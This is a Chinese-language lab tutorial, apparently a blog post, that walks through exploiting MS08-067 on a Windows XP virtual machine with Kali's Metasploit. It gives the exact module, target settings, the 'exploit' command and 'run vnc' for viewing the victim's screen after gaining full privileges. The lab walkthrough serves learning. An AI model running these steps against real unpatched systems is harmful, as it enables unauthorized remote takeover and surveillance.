内容速览

1.首先需要下载kali安装到VMware中，如何安装参考我之前的文本，要想复现该经典漏洞MS08\_067需要一个xp系统，防火墙关闭。这里xp系统的安装就不多做介绍了。

2.下载好kali后需要验证网络是否通畅,出现以下界面则网络通畅

```

ping www.baidu.com
```

![](../Images/5a72c8d72db60f624510d3d6dd370360.png)

若网络不通畅则检查自己的虚拟机设置

![](../Images/fd5ea39bce946b660546fcd1b3763ca5.png)

3.打开msfconsole工具

```

msfconsole
```

![](../Images/6a34e62129cd8a2175d468c7e37a0c8e.png)

4.查找ms08\_067,ms代表微软，08则代表08年发现的漏洞，067代表当年发现的第67个漏洞

```

search ms08_067
```

![](../Images/7890f64a292b6ce9b33a6904e739ee10.png)

5.使用上面的Name下面的漏洞名称

```

use exploit/windows/smb/ms08_067_netapi
```

![](../Images/ad046283ccecb3a77a0d9fc5f32cf3d5.png)

6.显示配置信息

![](../Images/a2cb810746c4e36ac7b356e4c8770a17.png)

其中rhost为远程主机ip，我们设置成有ms08\_067漏洞的xp系统的ip，用下面的命令进行设置。

7.设置rhost

```

set rhost 192.168.201.95 注意这里的ip为xp系统的ip地址
```

8.显示配置信息查看是否配置成功。如图rhost后面有ip地址则配置成功。

![](../Images/0b8bb6eea39a6b9be9948abad34dd06c.png)

9.我们查看target，用如下的命令

```

show targets
```

![](../Images/aedd09e6344362aa12974fe09774b0b6.png)

8.设置与自己系统相同的版本，这里我选择34，设置方式如下：

```

set target 34
```

![](../Images/85cc6bd700325208b8a02040e3d9d104.png)

9.好了到这里就配置结束了，我们开始运行：

```

exploit
```

![](../Images/21fca1880a74cd4bf8b894f24696d75a.png)

出现如下我们就成功了，已经获得了最高权限，可以进行各种操作了。

10.例如我们输入如下命令，查看对方屏幕，效果如下图：

```

run vnc
```
